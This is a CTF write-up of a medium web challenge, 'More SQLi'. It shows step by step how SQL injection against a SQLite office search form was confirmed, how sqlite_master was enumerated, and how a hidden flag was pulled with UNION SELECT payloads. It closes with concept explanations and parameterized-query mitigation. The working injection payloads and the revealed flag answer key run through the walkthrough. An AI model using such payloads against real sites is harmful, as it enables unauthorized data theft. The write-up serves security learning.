# CTF Write-up: More SQLi

## 1. Challenge Information

| Field | Details |
|---|---|
| Challenge | More SQLi |
| Platform | CyLab Security Academy |
| Category | Web Exploitation |
| Difficulty | Medium |
| Event | picoCTF 2023 |
| Vulnerability | SQL Injection (SQLi) |
| Database | SQLite |
| Status | Solved |

## 2. Objective

The objective was to identify and exploit a SQL injection vulnerability in a web application's office search functionality to retrieve the hidden flag from the SQLite database.

The application provided a search field labelled **Search Office**. After logging in, the page displayed office information, including city, address, and phone number.

## 3. Initial Reconnaissance

### Step 1: Explore the application

After logging in, I examined the welcome page and identified the office search form.

The application accepted a city name and displayed matching office records.

I used the browser's Developer Tools, particularly the Network tab, to inspect the request sent when searching.

### Step 2: Inspect the HTTP request

The search was submitted to `welcome.php` using an HTTP POST request.

The form contained a parameter named `search`.

Example request structure:

```http
POST /welcome.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

search=Nairobi&submit=Search
```

The application returned a normal HTTP response and displayed the matching office information.

**Observation:** The search value was a potential SQL injection entry point because it was used to retrieve records from a database.

## 4. Testing for SQL Injection

### Step 1: Test a Boolean condition

I tested the following input:

```sql
Nairobi' AND '1'='2' -- -
```

The condition `'1'='2'` is false. The search returned no records.

Next, I tested:

```sql
Nairobi' AND '1'='1' -- -
```

The condition `'1'='1'` is true. The Nairobi record appeared.

### Analysis

The different results indicated that the application might be inserting the search input directly into an SQL query without safely handling user-supplied data.

For example, a vulnerable query might resemble:

```sql
SELECT city, address, phone
FROM offices
WHERE city = '<user_input>';
```

The exact source code was not available, so this is a hypothetical example of how the vulnerability could work.

The `-- -` sequence comments out the remaining SQL on the line in SQLite-compatible contexts, preventing the original query suffix from interfering with the injected condition.

**Finding:** The search functionality was vulnerable to SQL injection.

## 5. Identifying the Database Tables

The challenge hint indicated that the database used SQLite.

SQLite provides a special metadata table named `sqlite_master`, which contains information about database objects such as tables and indexes.

### Payload

I entered the following into the City field:

```sql
Nairobi' UNION SELECT name, sql, 'x'
FROM sqlite_master
WHERE type='table' -- -
```

### Result

The application displayed the database's table names and their creation statements.

The following tables were discovered:

| Table | Relevant schema |
|---|---|
| `hints` | `id INTEGER NOT NULL PRIMARY KEY, info TEXT` |
| `more_table` | `id INTEGER NOT NULL PRIMARY KEY, flag TEXT` |
| `offices` | `id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT` |
| `users` | `name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER` |

### Analysis

The `more_table` table was particularly interesting because it contained a column named `flag`.

This provided a clear target for the next stage of the challenge.

## 6. Extracting the Flag

### Step 1: Construct a UNION query

The original results table displayed three columns:

1. City
2. Address
3. Phone

Therefore, the injected `UNION SELECT` also needed to return three columns with compatible data types.

I used the following payload:

```sql
Nairobi' UNION SELECT 'FLAG', flag, 'x'
FROM more_table -- -
```

### Step 2: Understand the payload

- `Nairobi'` closes the original string value.
- `UNION SELECT` combines the original query's results with the injected query's results.
- `'FLAG'` provides a label for the first displayed column.
- `flag` retrieves the flag value from `more_table`.
- `'x'` provides a value for the third column.
- `FROM more_table` specifies the table containing the flag.
- `-- -` comments out the remaining portion of the original SQL statement.

### Step 3: Capture the result

The application displayed the value stored in the `flag` column.

### Flag

```text
academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_9ac9da99}
```

**Result: Challenge solved successfully.**

## 7. Extra Learning: SQLite Concepts

### 7.1 What is SQLite?

SQLite is a relational database engine that stores data in a database file rather than requiring a separate database server process.

It supports SQL operations such as:

- `SELECT` — retrieve data.
- `INSERT` — add data.
- `UPDATE` — modify data.
- `DELETE` — remove data.
- `UNION` — combine the results of compatible queries.

### 7.2 What is `sqlite_master`?

`sqlite_master` is a SQLite system table that describes database objects.

For example, a legitimate database inspection query is:

```sql
SELECT name, sql
FROM sqlite_master
WHERE type = 'table';
```

This lists table names and their creation statements.

Another useful metadata query is:

```sql
SELECT name, type
FROM sqlite_master;
```

It lists database object names and their types.

### 7.3 What is `UNION SELECT`?

`UNION` combines the results of two `SELECT` statements.

For example:

```sql
SELECT city, address, phone
FROM offices

UNION

SELECT 'Example', 'Example Address', '000';
```

Both queries return three columns. Their corresponding columns must have compatible types.

By exploiting a vulnerable query, an attacker may be able to use `UNION SELECT` to retrieve information from a different table.

### 7.4 Why did the injected query need three columns?

The original application rendered three fields for each office.

The injected query therefore returned three expressions:

```sql
SELECT 'FLAG', flag, 'x'
FROM more_table;
```

The first and third expressions supplied placeholder values, while the second returned the flag.

The number and types of columns must be compatible with the original query for a UNION-based injection to work.

### 7.5 What is the difference between `AND` and `OR` tests?

Consider these conditions:

```sql
'1'='1'
```

This is true.

```sql
'1'='2'
```

This is false.

An `AND` condition requires both sides to be true. An `OR` condition requires at least one side to be true.

Comparing the application's responses to true and false conditions helps determine whether user input influences SQL query logic.

### 7.6 Why is `-- -` used?

In SQLite, `--` begins a single-line SQL comment. Everything after it on that line is treated as a comment.

The trailing space and hyphen in `-- -` are commonly used in SQL injection payloads to make comment handling more reliable across different database contexts. The exact requirements depend on the database and how the application constructs its query.

## 8. Security Impact

A successful SQL injection can expose data that the application was not intended to disclose.

Depending on database permissions and application design, the impact may include:

- Reading sensitive records.
- Disclosing database schema information.
- Extracting credentials or other confidential data.
- Bypassing search restrictions.
- Modifying or deleting data when the vulnerable query permits it.

In this challenge, the demonstrated impact was unauthorized retrieval of a hidden flag.

## 9. Mitigation and Secure Coding

### Use parameterized queries

Application code should keep SQL instructions separate from user-supplied values.

For example, in Python using SQLite:

```python
import sqlite3

connection = sqlite3.connect("app.db")
cursor = connection.cursor()

city = user_input

cursor.execute(
    """
    SELECT city, address, phone
    FROM offices
    WHERE city = ?
    """,
    (city,)
)

results = cursor.fetchall()
```

The `?` placeholder binds the supplied city as a value rather than allowing it to change the SQL query's structure.

### Additional security measures

- Validate input according to the application's requirements.
- Use least-privilege database permissions.
- Avoid exposing unnecessary database errors to users.
- Store credentials securely using appropriate password hashing.
- Log suspicious activity without recording sensitive information unnecessarily.
- Test database-backed inputs during security assessments.

Input validation alone is not a substitute for parameterized queries.

## 10. Lessons Learned

Through this challenge, I practised:

- Inspecting HTTP POST requests with browser Developer Tools.
- Identifying potential SQL injection points.
- Comparing true and false SQL conditions.
- Enumerating SQLite tables through `sqlite_master`.
- Understanding table schemas and column names.
- Using `UNION SELECT` to retrieve data through a vulnerable search form.
- Matching the number of selected columns to the application's output.
- Understanding the security impact of unsafe SQL query construction.

## 11. Final Summary

The challenge was solved by identifying a SQL injection vulnerability in the office search field, enumerating the SQLite database schema, locating the `more_table` table, and extracting its `flag` column using a UNION-based query.

The most important lesson is that a search field can become a database access point when user input is concatenated into SQL without proper parameterization.

**Final result:** Flag retrieved successfully.
